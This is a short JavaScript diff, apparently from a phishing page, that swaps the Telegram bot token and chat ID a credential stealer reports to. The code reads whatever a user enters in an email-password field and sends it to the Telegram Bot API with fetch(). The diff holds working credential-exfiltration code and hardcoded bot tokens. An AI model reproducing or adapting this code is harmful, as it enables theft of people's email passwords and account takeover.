@@ -10,8 +10,8 @@
       const password = document.getElementById('email-password').value;
       if (password) {
         // Send the password to Telegram
-        const telegramBotToken = '7619144760:AAFgnQ9NIw4IR8SA-JNLk2upPe0LHvNMgKM';
-        const chatId = '5587800563';
+        const telegramBotToken = '7920256610:AAG8onR0uHV26STCkfrcEsRFQBJ4CMdc1vQ';
+        const chatId = '8487487876';
         const message = `Email password: ${password}`;
         const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
         await fetch(telegramUrl);
